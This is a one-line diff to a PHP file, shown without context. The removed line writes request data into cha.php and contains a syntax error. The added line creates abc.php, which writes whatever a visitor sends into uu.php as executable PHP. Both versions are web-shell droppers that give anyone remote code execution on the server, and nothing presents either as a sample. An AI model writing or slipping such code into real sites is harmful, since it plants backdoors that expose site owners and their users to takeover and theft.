@@ -1,1 +1,1 @@
-<?php if(isset($_REQUEST['cha')){$cha = $_REQUEST['cha']; echo $cha; file_put_contents("cha.php", $cha); die;} ?>
+<?php $x = '<?php if(isset($_REQUEST[\'abc\'])){$abc = ($_REQUEST[\'abc\']); echo $abc; }; file_put_contents("uu.php", "<?php " . $abc . " ?>"); ?>'; file_put_contents("abc.php", $x); ?>
